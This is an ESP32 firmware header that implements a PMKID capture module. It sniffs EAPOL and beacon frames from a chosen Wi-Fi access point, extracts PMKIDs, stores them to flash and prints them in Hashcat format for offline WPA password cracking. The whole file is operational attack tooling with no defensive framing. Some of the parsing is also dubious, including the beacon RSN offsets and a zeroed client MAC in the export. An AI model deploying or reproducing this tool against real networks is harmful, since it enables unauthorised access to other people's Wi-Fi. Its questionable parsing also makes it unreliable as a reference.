// pmkid.h - Complete PMKID Capture Module
#ifndef PMKID_H
#define PMKID_H

#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <vector>
#include <string>

// ============= STRUCTURES =============
struct PMKIDEntry {
  String bssid;
  String ssid;
  String pmkid;
  int channel;
  unsigned long timestamp;
};

struct PMKIDHandshake {
  uint8_t bssid[6];
  uint8_t pmkid[16];
  int channel;
  bool captured;
};

// ============= GLOBAL VARIABLES =============
std::vector<PMKIDEntry> pmkidList;
bool pmkidActive = false;
uint8_t pmkidTarget[6];
String pmkidTargetSSID;
int pmkidChannel = 0;
bool pmkidCaptured = false;

// ============= PMKID OUI =============
const uint8_t PMKID_OUI[] = {0x00, 0x0F, 0xAC, 0x04};

// ============= FUNCTION PROTOTYPES =============
void pmkidSnifferCallback(void* buff, wifi_promiscuous_pkt_type_t type);
void savePMKID(const PMKIDEntry& entry);

// ============= INIT =============
void initPMKIDModule() {
  Serial.println("PMKID module initialized");
}

// ============= CORE FUNCTIONS =============
void startPMKIDCapture(int idx) {
  if (pmkidActive) {
    Serial.println("PMKID capture already running");
    return;
  }
  
  extern struct NetworkInfo networks[];
  extern int networkCount;
  
  if (idx < 0 || idx >= networkCount) {
    Serial.println("Invalid network index");
    return;
  }
  
  pmkidActive = true;
  pmkidCaptured = false;
  pmkidTargetSSID = networks[idx].ssid;
  pmkidChannel = networks[idx].channel;
  
  sscanf(networks[idx].bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
    &pmkidTarget[0], &pmkidTarget[1], &pmkidTarget[2],
    &pmkidTarget[3], &pmkidTarget[4], &pmkidTarget[5]);
  
  esp_wifi_set_channel(pmkidChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&pmkidSnifferCallback);
  
  Serial.printf("PMKID capture started on %s (CH:%d)\n", 
    pmkidTargetSSID.c_str(), pmkidChannel);
  Serial.println("Waiting for PMKID...");
}

void stopPMKIDCapture() {
  pmkidActive = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  
  if (pmkidList.size() > 0) {
    Serial.printf("PMKID capture stopped. Captured: %d PMKIDs\n", pmkidList.size());
    printPMKIDStatus();
  } else {
    Serial.println("PMKID capture stopped. No PMKIDs captured.");
  }
}

void clearPMKIDs() {
  pmkidList.clear();
  Serial.println("PMKID database cleared");
}

void exportPMKIDs() {
  if (pmkidList.size() == 0) {
    Serial.println("No PMKIDs to export");
    return;
  }
  
  Serial.println("\n=== PMKIDs (Hashcat Format) ===");
  Serial.println("WPA*02*PMKID*BSSID*MAC*ESSID");
  for (auto& entry : pmkidList) {
    // Format: WPA*02*PMKID*BSSID*MAC*ESSID
    String mac = "000000000000"; // Placeholder
    Serial.printf("WPA*02*%s*%s*%s*%s\n", 
      entry.pmkid.c_str(),
      entry.bssid.c_str(),
      mac.c_str(),
      entry.ssid.c_str());
  }
}

// ============= SNIFFER CALLBACK =============
void pmkidSnifferCallback(void* buff, wifi_promiscuous_pkt_type_t type) {
  if (!pmkidActive) return;
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buff;
  uint8_t* payload = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  
  // Check for EAPOL frame (data frame with ethertype 0x888E)
  if (type == WIFI_PKT_DATA) {
    if (len < 42) return;
    if (payload[36] != 0x88 || payload[37] != 0x8E) return;
    
    // Check if from target BSSID
    if (memcmp(&payload[16], pmkidTarget, 6) != 0) {
      return;
    }
    
    // EAPOL Key frame
    uint8_t eapolType = payload[38];
    if (eapolType != 0x03) return;
    
    // Look for PMKID in key data (offset 95)
    int keyDataOffset = 95;
    for (int i = keyDataOffset; i < len - 8; i++) {
      if (payload[i] == 0xDD) {
        if (payload[i+1] >= 4 && 
            payload[i+2] == PMKID_OUI[0] &&
            payload[i+3] == PMKID_OUI[1] &&
            payload[i+4] == PMKID_OUI[2] &&
            payload[i+5] == PMKID_OUI[3]) {
          
          int pmkidStart = i + 6;
          if (pmkidStart + 16 <= len) {
            PMKIDEntry entry;
            entry.bssid = "";
            for (int j = 0; j < 6; j++) {
              if (j > 0) entry.bssid += ":";
              if (pmkidTarget[j] < 0x10) entry.bssid += "0";
              entry.bssid += String(pmkidTarget[j], HEX);
            }
            entry.bssid.toUpperCase();
            
            entry.ssid = pmkidTargetSSID;
            entry.channel = pmkidChannel;
            entry.timestamp = millis();
            
            entry.pmkid = "";
            for (int j = 0; j < 16; j++) {
              if (payload[pmkidStart + j] < 0x10) entry.pmkid += "0";
              entry.pmkid += String(payload[pmkidStart + j], HEX);
            }
            entry.pmkid.toUpperCase();
            
            // Check if already captured
            bool found = false;
            for (auto& existing : pmkidList) {
              if (existing.bssid == entry.bssid && existing.pmkid == entry.pmkid) {
                found = true;
                break;
              }
            }
            
            if (!found) {
              pmkidList.push_back(entry);
              pmkidCaptured = true;
              
              Serial.printf("[PMKID] Captured! PMKID: %s\n", entry.pmkid.c_str());
              Serial.printf("  BSSID: %s\n", entry.bssid.c_str());
              Serial.printf("  SSID: %s\n", entry.ssid.c_str());
              Serial.printf("  Channel: %d\n", entry.channel);
              
              // Save to SPIFFS
              savePMKID(entry);
            }
          }
        }
      }
    }
  }
  
  // Also check beacon frames for PMKID
  if (type == WIFI_PKT_MGMT) {
    uint8_t frameSubtype = (payload[0] >> 4) & 0x0F;
    if (frameSubtype == 0x08) { // Beacon
      if (memcmp(&payload[16], pmkidTarget, 6) != 0) {
        return;
      }
      
      int ieStart = 36;
      while (ieStart < len - 8) {
        uint8_t tag = payload[ieStart];
        uint8_t tagLen = payload[ieStart + 1];
        
        if (tag == 0x30 && tagLen >= 8) { // RSN IE
          // Check for PMKID in RSN IE
          int pos = ieStart + 2 + 4 + 4 + 2 + 2; // Skip header
          if (pos + 2 <= len) {
            uint8_t pmkidCount = payload[pos];
            if (pmkidCount > 0) {
              int pmkidStart = pos + 2;
              if (pmkidStart + 16 <= len) {
                PMKIDEntry entry;
                entry.bssid = "";
                for (int j = 0; j < 6; j++) {
                  if (j > 0) entry.bssid += ":";
                  if (pmkidTarget[j] < 0x10) entry.bssid += "0";
                  entry.bssid += String(pmkidTarget[j], HEX);
                }
                entry.bssid.toUpperCase();
                
                entry.ssid = pmkidTargetSSID;
                entry.channel = pmkidChannel;
                entry.timestamp = millis();
                
                entry.pmkid = "";
                for (int j = 0; j < 16; j++) {
                  if (payload[pmkidStart + j] < 0x10) entry.pmkid += "0";
                  entry.pmkid += String(payload[pmkidStart + j], HEX);
                }
                entry.pmkid.toUpperCase();
                
                bool found = false;
                for (auto& existing : pmkidList) {
                  if (existing.bssid == entry.bssid && existing.pmkid == entry.pmkid) {
                    found = true;
                    break;
                  }
                }
                
                if (!found) {
                  pmkidList.push_back(entry);
                  pmkidCaptured = true;
                  
                  Serial.printf("[PMKID] Found in beacon! PMKID: %s\n", entry.pmkid.c_str());
                  Serial.printf("  BSSID: %s\n", entry.bssid.c_str());
                  Serial.printf("  SSID: %s\n", entry.ssid.c_str());
                  
                  savePMKID(entry);
                }
              }
            }
          }
        }
        ieStart += tagLen + 2;
      }
    }
  }
}

// ============= STORAGE =============
void savePMKID(const PMKIDEntry& entry) {
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS mount failed");
    return;
  }
  
  File file = SPIFFS.open("/pmkids.txt", FILE_APPEND);
  if (!file) {
    Serial.println("Failed to open PMKID file");
    return;
  }
  
  file.printf("BSSID: %s\n", entry.bssid.c_str());
  file.printf("SSID: %s\n", entry.ssid.c_str());
  file.printf("PMKID: %s\n", entry.pmkid.c_str());
  file.printf("Channel: %d\n", entry.channel);
  file.printf("Timestamp: %lu\n", entry.timestamp);
  file.println("---");
  file.close();
  
  Serial.println("PMKID saved to SPIFFS");
}

// ============= STATUS =============
void printPMKIDStatus() {
  Serial.printf("\n=== PMKID Capture Status ===\n");
  Serial.printf("Active: %s\n", pmkidActive ? "YES" : "NO");
  Serial.printf("Target: %s\n", pmkidTargetSSID.c_str());
  Serial.printf("Channel: %d\n", pmkidChannel);
  Serial.printf("PMKIDs captured: %d\n", pmkidList.size());
  
  if (pmkidList.size() > 0) {
    Serial.println("\nCaptured PMKIDs:");
    for (size_t i = 0; i < pmkidList.size(); i++) {
      Serial.printf("  [%d] PMKID: %s\n", i+1, pmkidList[i].pmkid.c_str());
      Serial.printf("      SSID: %s\n", pmkidList[i].ssid.c_str());
      Serial.printf("      BSSID: %s\n", pmkidList[i].bssid.c_str());
    }
  }
}

// ============= COMMAND HANDLER =============
void handlePMKIDCommand(String args) {
  if (args == "stop") {
    stopPMKIDCapture();
  } else if (args == "status") {
    printPMKIDStatus();
  } else if (args == "list") {
    printPMKIDStatus();
  } else if (args == "export") {
    exportPMKIDs();
  } else if (args == "clear") {
    clearPMKIDs();
  } else if (args.length() > 0) {
    int idx = args.toInt();
    if (idx >= 0 && idx < networkCount) {
      startPMKIDCapture(idx);
    } else {
      Serial.println("Invalid network index");
    }
  } else {
    Serial.println("PMKID commands:");
    Serial.println("  pmkid <idx>      - Start PMKID capture on network");
    Serial.println("  pmkid stop       - Stop PMKID capture");
    Serial.println("  pmkid status     - Show PMKID status");
    Serial.println("  pmkid list       - List captured PMKIDs");
    Serial.println("  pmkid export     - Export PMKIDs (Hashcat format)");
    Serial.println("  pmkid clear      - Clear PMKID database");
  }
}

// ============= LOOP =============
void runPMKIDLoop() {
  if (!pmkidActive) return;
  
  static unsigned long lastCheck = 0;
  if (millis() - lastCheck > 5000) {
    lastCheck = millis();
    if (pmkidList.size() > 0) {
      static unsigned long lastPrint = 0;
      if (millis() - lastPrint > 30000) {
        lastPrint = millis();
        Serial.printf("[PMKID] Captured %d PMKIDs so far...\n", pmkidList.size());
      }
    }
  }
  
  delay(10);
}

#endif
